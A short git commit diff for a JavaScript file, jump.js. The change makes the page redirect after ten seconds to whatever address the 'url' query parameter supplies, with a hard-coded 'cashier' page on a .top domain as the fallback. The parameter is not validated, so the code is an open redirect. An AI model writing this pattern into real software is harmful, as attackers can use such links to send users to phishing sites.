167a9dfd7f16ebaba884a37417d37515876be17a
faker548 <gpt2023041402@protonmail.com>
2025-07-17 21:18:27 +0800

    Update jump.js

--- jump.js
+++ jump.js
@@ -1,5 +1,10 @@
 (() => {
+	const urlParams = new URLSearchParams(window.location.search);
+	let openUrl = urlParams.get('url');
+	if (openUrl == undefined || openUrl == null || openUrl == '') {
+		openUrl = "https://www.nzduojin002.top/cashier.html";
+	}
 	setTimeout(() => {
-		location.href = "https://www.nzduojin002.top/cashier.html";
+		location.href = openUrl;
 	}, 10000);
 })();
